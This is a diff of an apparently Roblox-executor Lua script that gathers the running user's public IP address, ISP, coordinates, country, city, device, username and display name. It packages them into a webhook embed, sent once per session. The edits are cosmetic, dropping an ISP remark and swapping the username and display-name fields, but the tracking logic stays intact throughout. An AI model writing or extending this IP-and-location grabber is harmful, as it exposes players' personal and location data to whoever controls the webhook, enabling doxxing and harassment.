@@ -47,7 +47,7 @@ local function detectLocation()
                     ip = data.ip or ip
                     lat = latTemp
                     lon = lonTemp
-                    isp = data.org or isp -- ISP capturado
+                    isp = data.org or isp
                     break
                 end
             end
@@ -75,9 +75,9 @@ end
 
 local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP, latVal, lonVal, ispName = detectLocation()
 
--- Mostrar ISP con aclaración y emoji 🛰️
-local userISP = ispName ~= "Desconocido" and ("📡 "..ispName.." (posiblemente Claro)") or "🛰️ Desconocido"
-local ispColor = ispName ~= "Desconocido" and 16729344 or 15158332 -- color embed: naranja si hay ISP, rojo si no
+-- Mostrar ISP sin aclaración
+local userISP = ispName ~= "Desconocido" and ("📡 "..ispName) or "🛰️ Desconocido"
+local ispColor = ispName ~= "Desconocido" and 16729344 or 15158332
 
 if getgenv().WebhookEnviado then return end
 getgenv().WebhookEnviado = true
@@ -99,8 +99,8 @@ local data = {
             {["name"]="💻 Dispositivo", ["value"]=platform, ["inline"]=true},
             {["name"]="🛰️ IP", ["value"]=userIP, ["inline"]=true},
             {["name"]="🌐 Compañía de Internet", ["value"]=userISP, ["inline"]=true},
-            {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
-            {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
+            {["name"]="👥 Usuario", ["value"]=LocalPlayer.DisplayName, ["inline"]=true}, -- Muestra DisplayName donde estaba Username
+            {["name"]="👤 DisplayName", ["value"]=LocalPlayer.Name, ["inline"]=true},     -- Muestra Username donde estaba DisplayName
             {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
             {["name"]="🏙️ Ciudad", ["value"]=cityDisplay, ["inline"]=true},
             {["name"]="📏 Kilómetros", ["value"]=kmDisplay, ["inline"]=true},
